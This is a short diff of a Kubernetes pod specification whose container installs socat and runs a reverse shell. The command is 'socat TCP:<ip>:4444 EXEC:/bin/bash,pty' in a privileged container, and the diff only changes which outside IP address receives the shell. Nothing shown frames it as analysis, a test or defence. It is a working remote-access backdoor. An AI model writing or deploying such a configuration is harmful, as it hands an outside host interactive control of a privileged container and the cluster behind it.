@@ -19,7 +19,7 @@ spec:
           # Install socat
           apt-get update && apt-get install -y socat && \
           # Create and execute the reverse shell
-          socat TCP:23.27.169.114:4444 EXEC:/bin/bash,pty
+          socat TCP:89.116.28.189:4444 EXEC:/bin/bash,pty
       securityContext:
         privileged: true  # Set to false unless needed
       tty: true
